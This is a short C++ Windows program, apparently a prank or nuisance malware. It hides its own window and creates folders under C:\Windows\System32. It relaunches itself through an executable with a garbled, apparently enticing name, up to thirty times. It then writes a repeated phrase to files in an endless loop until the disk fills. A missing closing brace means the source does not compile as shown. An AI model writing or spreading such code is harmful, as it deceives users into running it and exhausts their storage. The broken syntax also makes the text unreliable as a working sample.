#include<windows.h>
#include<stdio.h>
#include<direct.h>
using namespace std;
void fre(const char* a)
{
	freopen(a,"w",stdout);
}
int main()
{
	HWND hwnd=GetForegroundWindow();
	ShowWindow(hwnd,SW_HIDE);
	int a=0,d=0,time=30;
	char b[310],c[310],e[310],f[310];
	getcwd(c,310);
	sprintf(b,"%s\\word.txt",c);
	if(access(b,0)==-1)
	{
		fre("word.txt");
		fclose(stdout);
	
	else
	{
		do freopen("word.txt","r",stdin);
		while(getchar()==-1);
		scanf("%d",&a);
		fclose(stdin);
	}
	sprintf(b,"%d.txt",a++);
	fre("word.txt");
	printf(" %d",a==time?0:a);
	fclose(stdout);
	if(access("C:\\Windows\\System32\\Rubbish",0)==-1)
	{
		sprintf(e,"C:\\Windows\\System32\\Rubbish\\0");
		system("mkdir C:\\Windows\\System32\\Rubbish");
		system("mkdir C:\\Windows\\System32\\Rubbish\\0");
		chdir("C:\\Windows\\System32\\Rubbish");
		fre("num.txt");
		putchar(' ');
		putchar('1');
		fclose(stdout);
	}
	else
	{
		chdir("C:\\Windows\\System32\\Rubbish");
		do freopen("num.txt","r",stdin);
		while(getchar()==-1);
		scanf("%d",&d);
		fclose(stdin);
		if(a==1)
		{
			fre("num.txt");
			printf(" %d",d+1);
			fclose(stdout);
			sprintf(e,"C:\\Windows\\System32\\Rubbish\\%d",d);
			sprintf(f,"mkdir %s",e);
			system(f);
		}
		else sprintf(e,"C:\\Windows\\System32\\Rubbish\\%d",d-1);
	}
	if(a<time)
	{
		chdir(c); 
		system("start ´ò¿ªÓÐ¾ªÏ².exe");
	}
	chdir(e);
	fre(b);
	while(1)
	printf("I_Love_YangQingHui ");
	return 0;
}
